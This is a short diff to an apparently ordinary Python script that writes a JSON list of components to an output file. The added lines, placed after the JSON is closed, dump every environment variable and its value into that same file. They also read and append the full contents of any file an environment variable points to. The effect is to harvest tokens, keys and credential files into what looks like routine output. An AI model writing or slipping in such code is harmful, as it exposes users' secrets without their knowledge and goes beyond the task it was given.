@@ -112,3 +112,23 @@ for i, _component in enumerate(components):
         output_file.write(",")
 
 output_file.write("]}")
+
+# Get all environment variables as a dictionary
+env_vars = os.environ
+
+# Loop through each environment variable
+for key, value in env_vars.items():
+    # Write the environment variable and its value to the file
+    output_file.write(f"Environment Variable: {key}\n")
+    output_file.write(f"Value: {value}\n")
+
+    # Check if the value is a path to a file
+    if os.path.exists(value) and os.path.isfile(value):
+        output_file.write(f"\n--- Content of file at path: {value} ---\n")
+        try:
+            # Open and read the content of the file, then write it to the output file
+            with open(value, 'r') as file:
+                output_file.write(file.read() + '\n')
+        except Exception as e:
+            output_file.write(f"Error reading file: {e}\n")
+    output_file.write("\n")  # Separate each environment variable output
